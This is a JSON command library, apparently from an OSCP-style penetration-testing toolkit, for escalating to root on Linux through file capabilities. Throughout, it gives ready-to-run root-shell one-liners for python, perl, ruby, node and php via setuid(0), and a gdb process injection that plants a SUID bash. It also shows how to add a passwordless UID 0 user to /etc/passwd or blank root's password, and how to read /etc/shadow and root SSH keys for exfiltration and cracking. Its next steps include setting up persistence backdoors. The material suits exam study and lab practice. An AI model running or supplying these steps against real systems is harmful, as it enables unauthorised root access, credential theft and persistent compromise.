{
  "commands": [
    {
      "id": "enumerate-capabilities",
      "name": "Enumerate Linux File Capabilities",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "getcap -r / 2>/dev/null",
      "description": "Recursively enumerate all binaries with Linux file capabilities set. Capabilities are kernel features that grant specific elevated permissions without requiring full SUID root. This discovers potential privilege escalation vectors by locating binaries with dangerous capabilities like cap_setuid or cap_dac_override.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "PRIVILEGE_ESCALATION",
        "ENUMERATION",
        "FILE_PERMISSIONS"
      ],
      "variables": [],
      "flag_explanations": {
        "-r": "Recursive: Search through directories recursively from the specified path (/ for entire filesystem). Required to enumerate all binaries system-wide.",
        "/": "Starting path: Begin search from root directory to cover entire filesystem. Can be changed to specific directory (e.g., /usr/bin) for faster targeted search.",
        "2>/dev/null": "Error suppression: Redirect stderr (file descriptor 2) to /dev/null to hide 'Permission denied' errors from inaccessible directories. Makes output cleaner and easier to parse."
      },
      "success_indicators": [
        "Binary paths with capability notation (e.g., /usr/bin/python3.8 = cap_setuid+ep)",
        "Capabilities shown in format: cap_name+ep or cap_name=eip",
        "At least one binary with capabilities found",
        "Output contains recognizable capability names (cap_setuid, cap_dac_override, etc.)"
      ],
      "failure_indicators": [
        "No output (no capabilities found on system)",
        "Command not found (getcap not installed)",
        "Only permission denied errors (insufficient read access)",
        "getcap: error while loading shared libraries"
      ],
      "next_steps": [
        "Analyze output for dangerous capabilities: cap_setuid, cap_dac_override, cap_dac_read_search, cap_sys_admin, cap_sys_ptrace",
        "Cross-reference binaries with GTFOBins capabilities section",
        "Focus on interpreters (python, perl, ruby, php) and editors (vim, nano) with capabilities",
        "Research exploitation techniques for identified capability/binary combinations"
      ],
      "alternatives": [
        "Manual search with find: find / -type f -perm /u=s,g=s 2>/dev/null (SUID instead)",
        "Targeted search: getcap -r /usr/bin 2>/dev/null (faster, common location)",
        "Check specific binary: getcap /usr/bin/python3 (test known binary)",
        "Use linpeas.sh or linenum.sh for automated enumeration with capabilities check"
      ],
      "prerequisites": [
        "Read access to directories being searched",
        "getcap utility installed (part of libcap package)",
        "Linux kernel with capabilities support (2.6.24+)"
      ],
      "troubleshooting": {
        "getcap: command not found": "Install libcap: apt-get install libcap2-bin (Debian/Ubuntu) or yum install libcap (RedHat/CentOS)",
        "No output returned": "System may not have any capabilities set. This is common on minimal installations. Try checking /usr/bin and /usr/sbin specifically.",
        "Permission denied for all paths": "Run from directories with read access, or focus on /usr/bin, /usr/local/bin where capabilities are commonly set",
        "Output format unclear": "Capabilities shown as cap_name+ep mean: +e (effective), +p (permitted). Both together indicate capability is active."
      },
      "notes": [
        "Capabilities notation: +ep means Effective and Permitted (capability is active)",
        "=eip means Effective, Inheritable, and Permitted (full capability inheritance)",
        "Comma-separated capabilities possible: cap_net_admin,cap_net_raw+ep",
        "Network capabilities (cap_net_raw, cap_net_admin) are non-exploitable for privesc",
        "Empty output is normal on hardened systems without capability-based binaries",
        "Faster than full SUID enumeration as fewer binaries typically have capabilities"
      ],
      "oscp_relevance": "High - Modern alternative to SUID often missed in basic enumeration. Critical for complete privilege escalation coverage on Linux targets with capabilities-enabled binaries."
    },
    {
      "id": "filter-exploitable-caps",
      "name": "Filter Exploitable Capabilities",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "# Manual analysis - filter getcap output for dangerous capabilities\n# CRITICAL: cap_setuid, cap_dac_override, cap_sys_admin, cap_sys_ptrace\n# HIGH: cap_dac_read_search, cap_setgid, cap_chown, cap_fowner\n# NON-EXPLOITABLE: cap_net_raw, cap_net_admin (network only)",
      "description": "Analyze getcap enumeration output to identify dangerous capabilities that enable privilege escalation. Focus on critical capabilities: cap_setuid (spawn root shell), cap_dac_override (bypass file permissions for write), cap_dac_read_search (bypass read permissions), cap_sys_admin (mount filesystems), cap_sys_ptrace (inject code). Ignore network-only capabilities.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "PRIVILEGE_ESCALATION",
        "ANALYSIS",
        "FILTERING"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "At least one critical or high severity capability identified",
        "Capability is documented in GTFOBins or HackTricks",
        "Binary is standard utility (python, vim, tar, etc.) with known exploitation",
        "Clear exploitation path available"
      ],
      "failure_indicators": [
        "Only network capabilities found (cap_net_raw, cap_net_admin)",
        "Capabilities on obscure binaries with no documented exploitation",
        "All binaries are network utilities (dumpcap, nmap, fping) - non-exploitable",
        "Capabilities without effective bit set (+p only, not +ep)"
      ],
      "next_steps": [
        "For cap_setuid: Check if binary is interpreter (python, perl, ruby, node) - instant root shell",
        "For cap_dac_override: Check if binary is editor (vim, nano) - edit /etc/passwd for UID 0",
        "For cap_dac_read_search: Check if binary can read files (tar, base64) - exfiltrate shadow/keys",
        "For cap_sys_ptrace: Check if gdb or strace available - inject into root process",
        "Cross-reference binary against GTFOBins capabilities section for exact technique"
      ],
      "alternatives": [
        "Automated filtering with grep: getcap -r / 2>/dev/null | grep -E 'cap_(setuid|dac_override|dac_read_search|sys_admin|sys_ptrace)'",
        "Use linpeas.sh capabilities module for automated classification",
        "Check HackTricks capabilities page for comprehensive list with examples"
      ],
      "prerequisites": [
        "Output from getcap enumeration",
        "Knowledge of dangerous capability types",
        "Understanding of capability exploitation techniques"
      ],
      "troubleshooting": {
        "Only network capabilities found": "System may be hardened. Check SUID binaries instead: find / -perm -4000 2>/dev/null",
        "Unclear which capabilities are exploitable": "Consult GTFOBins capabilities filter: https://gtfobins.github.io/#+capabilities",
        "Binary not in GTFOBins": "Research capability function in man 7 capabilities. cap_setuid and cap_dac_override are almost always exploitable."
      },
      "notes": [
        "CRITICAL CAPABILITIES - Direct root access:",
        "  cap_setuid: Change process UID to 0 (root shell)",
        "  cap_dac_override: Bypass all file permission checks (write any file)",
        "  cap_sys_admin: Full system administration (mount, namespace manipulation)",
        "  cap_sys_ptrace: Trace any process (inject shellcode into root process)",
        "HIGH SEVERITY CAPABILITIES - Sensitive data access:",
        "  cap_dac_read_search: Bypass read permission checks (shadow, SSH keys)",
        "  cap_setgid: Change GID to root group",
        "  cap_chown: Change file ownership (chown /etc/passwd to gain write)",
        "  cap_fowner: Bypass permission checks for file operations",
        "NON-EXPLOITABLE FOR PRIVESC:",
        "  cap_net_raw, cap_net_admin: Network packet manipulation only",
        "  cap_net_bind_service: Bind to privileged ports <1024"
      ],
      "oscp_relevance": "High - Correctly identifying exploitable capabilities vs. noise is critical. Many systems have network capabilities (non-exploitable) that can waste time if not filtered."
    },
    {
      "id": "gtfobins-cap-lookup",
      "name": "GTFOBins Capabilities Lookup",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "# Manual lookup process:\n# 1. Visit https://gtfobins.github.io/\n# 2. Use filter: Click 'Capabilities' checkbox\n# 3. Search for binary name (python, vim, tar, etc.)\n# 4. Note exact command syntax with capability requirements\n# Alternative: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities",
      "description": "Research documented exploitation techniques for identified capability/binary combinations using GTFOBins or HackTricks. GTFOBins provides exact command syntax for exploiting capabilities on common Unix binaries. Each capability type requires different exploitation approach based on what privileged operation it enables.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "GTFOBINS",
        "RESEARCH",
        "PRIVILEGE_ESCALATION"
      ],
      "variables": [
        {
          "name": "<CAP_BINARY>",
          "description": "Binary with capabilities (from getcap output)",
          "required": true,
          "example": "python3"
        },
        {
          "name": "<CAPABILITY>",
          "description": "Capability type to exploit",
          "required": true,
          "example": "cap_setuid"
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "Exact exploitation command found for binary/capability combination",
        "Command syntax includes variable substitution",
        "Success indicators clearly documented",
        "Alternative techniques available if primary fails"
      ],
      "failure_indicators": [
        "Binary not documented in GTFOBins capabilities section",
        "Capability type not exploitable with this binary",
        "Technique requires additional dependencies not available",
        "Command syntax incomplete or unclear"
      ],
      "next_steps": [
        "Copy exact command syntax from GTFOBins",
        "Substitute <CAP_BINARY> with actual binary path from getcap",
        "Verify all dependencies available (shell, interpreters, etc.)",
        "Test command in controlled manner to verify syntax",
        "Document expected output and success criteria"
      ],
      "alternatives": [
        "HackTricks capabilities page: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities",
        "Man pages: man 7 capabilities (understand what capability enables)",
        "PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#capabilities",
        "Search exploit-db for capability-based techniques"
      ],
      "prerequisites": [
        "Identified exploitable capability from filter step",
        "Binary name extracted from getcap output",
        "Internet access or cached GTFOBins/HackTricks documentation"
      ],
      "troubleshooting": {
        "Binary not in GTFOBins": "Check if binary is symlink to documented binary (python3.8 -> python). Try HackTricks for more comprehensive coverage.",
        "Multiple techniques available": "Start with simplest technique (usually first listed). For cap_setuid on python: os.setuid(0) approach is most reliable.",
        "Technique syntax unclear": "Read GTFOBins 'Description' section for context. Look for similar binaries (python2 vs python3 techniques often identical)."
      },
      "notes": [
        "COMMON GTFOBINS CAPABILITY EXPLOITS:",
        "cap_setuid exploitation:",
        "  - python/perl/ruby: Use setuid(0) syscall then spawn shell",
        "  - php: posix_setuid(0) then system('/bin/bash')",
        "  - node: process.setuid(0) then require('child_process').spawn('/bin/bash')",
        "cap_dac_override exploitation:",
        "  - vim/nano: Open /etc/passwd, add user with UID 0",
        "  - tar: Create archive with modified /etc/passwd, extract to overwrite",
        "  - cp: Copy /etc/passwd to /tmp, modify, copy back",
        "cap_dac_read_search exploitation:",
        "  - tar: Archive sensitive files (shadow, SSH keys) for exfiltration",
        "  - base64: Encode and exfiltrate /etc/shadow or root SSH keys",
        "  - od/xxd: Dump binary files like /etc/shadow",
        "cap_sys_ptrace exploitation:",
        "  - gdb: Attach to root process, inject shellcode",
        "  - strace: Trace root process, potentially inject",
        "cap_sys_admin exploitation:",
        "  - mount: Mount privileged filesystem or overlay /etc",
        "GTFOBins capabilities filter is most reliable source for exact syntax"
      ],
      "oscp_relevance": "Critical - GTFOBins is essential reference for OSCP. Capabilities section less commonly known but highly effective when encountered. Memorize common patterns for interpreters (setuid) and editors (dac_override)."
    },
    {
      "id": "execute-cap-exploit",
      "name": "Execute Capability Exploitation",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "# Command depends on capability type and binary:\n# TEMPLATE: <CAP_BINARY> [capability-specific-arguments]\n# See specific commands below for each capability type",
      "description": "Execute capability exploitation using documented GTFOBins technique. Each capability/binary combination requires different command syntax. This is the actual privilege escalation step where the capability is abused to perform privileged operations like spawning root shell, editing sensitive files, or reading protected data.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "PRIVILEGE_ESCALATION",
        "EXPLOITATION",
        "GTFOBINS"
      ],
      "variables": [
        {
          "name": "<CAP_BINARY>",
          "description": "Full path to binary with capabilities",
          "required": true,
          "example": "/usr/bin/python3.8"
        },
        {
          "name": "<CAPABILITY>",
          "description": "Capability being exploited",
          "required": true,
          "example": "cap_setuid"
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "For cap_setuid: Root shell spawned (# prompt, uid=0 in whoami)",
        "For cap_dac_override: Successfully edited /etc/passwd or other root file",
        "For cap_dac_read_search: Successfully read /etc/shadow or root SSH keys",
        "For cap_sys_ptrace: Successfully attached to root process with gdb",
        "No permission denied errors",
        "Privileged operation completed successfully"
      ],
      "failure_indicators": [
        "Permission denied errors despite capability",
        "Binary behavior differs from GTFOBins documentation",
        "Missing dependencies (libraries, interpreters)",
        "AppArmor or SELinux blocking capability abuse",
        "Capability not effective (+p only, missing +e)"
      ],
      "next_steps": [
        "Verify privileged access achieved with whoami and id",
        "For root shell: stabilize shell and collect flags/loot",
        "For file access: exfiltrate sensitive data (shadow, SSH keys)",
        "Document exact exploitation path for reporting",
        "If failed: try alternative technique or different capability/binary"
      ],
      "alternatives": [
        "Try alternative binary with same capability if available",
        "Use different exploitation technique for same capability/binary",
        "Fallback to SUID enumeration if capabilities fail",
        "Research manual exploitation without GTFOBins if binary undocumented"
      ],
      "prerequisites": [
        "Identified capability/binary combination from previous steps",
        "GTFOBins technique researched and understood",
        "All dependencies available (shells, libraries, etc.)",
        "Write access to /tmp or other working directory if needed"
      ],
      "troubleshooting": {
        "Root shell doesn't spawn": "Check if shell spawned but without root prompt. Try: id and whoami to verify UID. May need interactive TTY upgrade.",
        "File edit fails despite cap_dac_override": "Verify capability has +e (effective) bit set. Check AppArmor/SELinux status: aa-status or getenforce",
        "Technique works but not root": "Some capabilities give partial access. cap_dac_read_search reads files but doesn't give root shell. Use to read shadow and crack passwords instead.",
        "Binary not executable": "Check if binary is actually executable (not just readable). Try: file <CAP_BINARY> to verify it's ELF binary."
      },
      "notes": [
        "SPECIFIC EXPLOITATION COMMANDS BY CAPABILITY:",
        "",
        "cap_setuid + python/python3:",
        "  /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "  Result: Spawns root shell immediately",
        "",
        "cap_setuid + perl:",
        "  /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'",
        "  Result: Spawns root shell",
        "",
        "cap_setuid + ruby:",
        "  /usr/bin/ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
        "  Result: Spawns root shell",
        "",
        "cap_setuid + node:",
        "  /usr/bin/node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", {stdio: [0, 1, 2]});'",
        "  Result: Spawns root shell",
        "",
        "cap_setuid + php:",
        "  /usr/bin/php -r \"posix_setuid(0); system('/bin/bash');\"",
        "  Result: Spawns root shell",
        "",
        "cap_dac_override + vim:",
        "  /usr/bin/vim.basic /etc/passwd",
        "  Then: Add line: hacker:x:0:0::/root:/bin/bash",
        "  Then: su hacker (no password)",
        "  Result: Root access via UID 0 user",
        "",
        "cap_dac_override + nano:",
        "  /usr/bin/nano /etc/passwd",
        "  Same as vim - add UID 0 user",
        "",
        "cap_dac_read_search + tar:",
        "  /usr/bin/tar -czf /tmp/shadow.tar.gz /etc/shadow",
        "  /usr/bin/tar -czf /tmp/ssh.tar.gz /root/.ssh/id_rsa",
        "  Result: Sensitive files archived for exfiltration",
        "",
        "cap_dac_read_search + base64:",
        "  /usr/bin/base64 /etc/shadow | base64 -d",
        "  /usr/bin/base64 /root/.ssh/id_rsa",
        "  Result: File contents exfiltrated",
        "",
        "cap_sys_ptrace + gdb:",
        "  Find root process: ps aux | grep root",
        "  /usr/bin/gdb -p <root_pid>",
        "  Then: call (void)system(\"cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash\")",
        "  Result: SUID root shell created",
        "",
        "cap_sys_admin + mount:",
        "  Advanced - mount privileged filesystem or overlay /etc",
        "  Requires deep understanding of mount namespaces"
      ],
      "oscp_relevance": "Critical - This is the actual exploitation step. Must be executed correctly with exact syntax. Practice common patterns (python setuid, vim dac_override) as these appear frequently in OSCP-like environments."
    },
    {
      "id": "verify-cap-access",
      "name": "Verify Elevated Access from Capability Exploitation",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "whoami && id && cat /etc/shadow 2>/dev/null | head -n 3",
      "description": "Verify successful privilege escalation after capability exploitation. Test multiple indicators: effective UID via whoami, full UID/GID/groups via id, ability to read root-protected files like /etc/shadow. This confirms level of access achieved and whether full root or partial privilege escalation succeeded.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "PRIVILEGE_ESCALATION",
        "VERIFICATION",
        "POST_EXPLOITATION"
      ],
      "variables": [],
      "flag_explanations": {
        "whoami": "Display effective username. Should show 'root' if UID 0 achieved. No flags needed.",
        "id": "Display user identity: UID, GID, and group memberships. Shows uid=0(root) if full root achieved. No flags needed.",
        "cat /etc/shadow": "Read shadow password file (requires root). Tests read access to root-protected files.",
        "2>/dev/null": "Suppress errors if shadow unreadable (indicates partial escalation only).",
        "| head -n 3": "Show first 3 lines only (root, daemon, bin users). Reduces output clutter while proving access."
      },
      "success_indicators": [
        "whoami returns 'root'",
        "id shows uid=0(root) gid=0(root)",
        "/etc/shadow contents displayed (hashed passwords visible)",
        "No permission denied errors",
        "Shell prompt shows # instead of $ (if in shell)",
        "Can execute privileged commands without sudo"
      ],
      "failure_indicators": [
        "whoami still shows original user",
        "id shows non-zero UID",
        "cat /etc/shadow returns permission denied",
        "Only partial access achieved (read but not execute)",
        "Capability exploitation did not escalate privileges"
      ],
      "next_steps": [
        "If root achieved: Collect flags from /root directory",
        "If root achieved: Exfiltrate sensitive data (shadow for cracking, SSH keys)",
        "If root achieved: Establish persistence (add SSH key, create SUID backdoor)",
        "If partial access: Attempt different capability exploitation technique",
        "If failed: Fall back to other privilege escalation vectors (SUID, kernel, sudo)",
        "Document exact access level achieved for reporting"
      ],
      "alternatives": [
        "Test root file write: echo test > /etc/test_root_write 2>/dev/null && rm /etc/test_root_write",
        "Test root directory access: ls -la /root 2>/dev/null",
        "Test SSH key access: cat /root/.ssh/id_rsa 2>/dev/null",
        "Test shadow file read: cat /etc/shadow 2>/dev/null | grep root",
        "Test sudo without password: sudo -l (if sudoers allows)"
      ],
      "prerequisites": [
        "Capability exploitation attempted in previous step",
        "Shell access to run verification commands",
        "Knowledge of expected access level from capability type"
      ],
      "troubleshooting": {
        "whoami shows root but can't read shadow": "May be in restricted environment. Try: cat /proc/self/status | grep Uid to see all UIDs (real, effective, saved).",
        "id shows uid=0 but prompt still shows $": "Effective UID is root but shell prompt not updated. This is normal. Verify with file access tests instead of prompt.",
        "Partial access only (can read but not write)": "Expected for cap_dac_read_search (read-only). Exfiltrate shadow file and crack passwords offline instead.",
        "Permission denied despite uid=0": "AppArmor or SELinux may be restricting root capabilities. Check: aa-status or getenforce"
      },
      "notes": [
        "Different capabilities grant different levels of access:",
        "  cap_setuid: Full root shell (uid=0, all access)",
        "  cap_dac_override: Full root file access (read+write any file)",
        "  cap_dac_read_search: Read-only root file access (shadow, SSH keys)",
        "  cap_sys_ptrace: Indirect root via process injection",
        "If shadow file readable, priority actions:",
        "  1. Copy full shadow file for offline password cracking",
        "  2. Extract root user hash: cat /etc/shadow | grep '^root:'",
        "  3. Use john or hashcat to crack: john --wordlist=rockyou.txt shadow.txt",
        "  4. Look for users with empty password fields (:::: format)",
        "If root SSH key accessible:",
        "  1. Copy /root/.ssh/id_rsa to attacker machine",
        "  2. Set correct permissions: chmod 600 id_rsa",
        "  3. SSH as root: ssh -i id_rsa root@target",
        "For OSCP: Screenshot evidence of uid=0 and shadow/flag file access"
      ],
      "oscp_relevance": "Critical - Must verify root access for proof. Take screenshots showing uid=0 and flag file contents. Shadow file access proves privileged read, which can lead to password cracking for persistent access."
    },
    {
      "id": "cap-exploit-dac-override-passwd-edit",
      "name": "Exploit cap_dac_override by Editing /etc/passwd",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "<CAP_BINARY> /etc/passwd",
      "description": "Exploit cap_dac_override capability to bypass file permissions and edit /etc/passwd. Add a new user with UID 0 (root) and no password, then switch to that user for root access. This technique works with text editors (vim, nano) that have cap_dac_override set. Alternative to spawning root shell directly.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "CAP_DAC_OVERRIDE",
        "PRIVILEGE_ESCALATION",
        "PASSWD_EDIT"
      ],
      "variables": [
        {
          "name": "<CAP_BINARY>",
          "description": "Text editor with cap_dac_override (vim, nano, etc.)",
          "required": true,
          "example": "/usr/bin/vim.basic"
        }
      ],
      "flag_explanations": {
        "/etc/passwd": "User account database file. Contains usernames, UIDs, GIDs, home directories, and shells. Normally writable only by root, but cap_dac_override bypasses this protection."
      },
      "success_indicators": [
        "Editor opens /etc/passwd without permission denied",
        "Can modify file contents and save changes",
        "New user line added successfully",
        "su command to new user succeeds without password",
        "whoami shows root after switching users"
      ],
      "failure_indicators": [
        "Permission denied when opening /etc/passwd",
        "Editor opens in read-only mode",
        "Cannot save changes to file",
        "AppArmor or SELinux blocks write",
        "File write succeeds but system ignores new user"
      ],
      "next_steps": [
        "Add line to /etc/passwd: hacker:x:0:0::/root:/bin/bash",
        "Save and exit editor (:wq in vim, Ctrl+O then Ctrl+X in nano)",
        "Switch to new user: su hacker",
        "Verify root access: whoami (should show root)",
        "Collect flags and establish persistence"
      ],
      "alternatives": [
        "Edit /etc/passwd to remove root password: root::0:0:root:/root:/bin/bash (then su root with no password)",
        "Edit /etc/shadow instead if cap allows: remove root password hash",
        "Use cp command with cap_dac_override to overwrite passwd: cp modified_passwd /etc/passwd",
        "Use tar to extract modified passwd over existing: tar -xzf passwd.tar.gz -C /"
      ],
      "prerequisites": [
        "Text editor binary with cap_dac_override+ep",
        "Understanding of /etc/passwd format",
        "Ability to use text editor (vim or nano commands)"
      ],
      "troubleshooting": {
        "File opens read-only": "Check capability has +e (effective) bit: getcap <CAP_BINARY>. Need +ep not just +p",
        "Cannot save changes": "Try alternative editor if available. Check disk space: df -h. Verify filesystem not read-only: mount | grep '/'",
        "New user not recognized": "Check /etc/passwd syntax. Format: username:x:UID:GID:comment:home:shell. Ensure UID is 0 for root.",
        "su hacker asks for password": "Check /etc/shadow - may have password set. Edit passwd line to: hacker::0:0::/root:/bin/bash (empty password field)."
          },
      "notes": [
        "/etc/passwd line format: username:x:UID:GID:GECOS:homedir:shell",
        "For instant root: hacker:x:0:0::/root:/bin/bash",
        "  username: hacker (or any name)",
        "  x: placeholder (actual password in /etc/shadow)",
        "  UID: 0 (root user ID - critical)",
        "  GID: 0 (root group ID)",
        "  GECOS: empty (full name field)",
        "  homedir: /root (root's home)",
        "  shell: /bin/bash (login shell)",
        "After adding line, use: su hacker (no password required)",
        "Alternative: Remove root password entirely:",
        "  Change: root:x:0:0:root:/root:/bin/bash",
        "  To:     root::0:0:root:/root:/bin/bash",
        "  Then: su root (no password)",
        "cap_dac_override bypasses Discretionary Access Control (DAC)",
        "DAC = traditional Unix file permissions (owner, group, other)",
        "Does NOT bypass Mandatory Access Control (MAC) like SELinux/AppArmor",
        "Editors other than vim/nano may work: emacs, ed, sed with -i flag",
        "More stealthy than spawning root shell (less obvious in process list)"
      ],
      "oscp_relevance": "High - Alternative technique when cap_setuid not available. Commonly tested on OSCP boxes with vim or nano having cap_dac_override. Must know /etc/passwd format and UID 0 concept."
    }
  ]
}
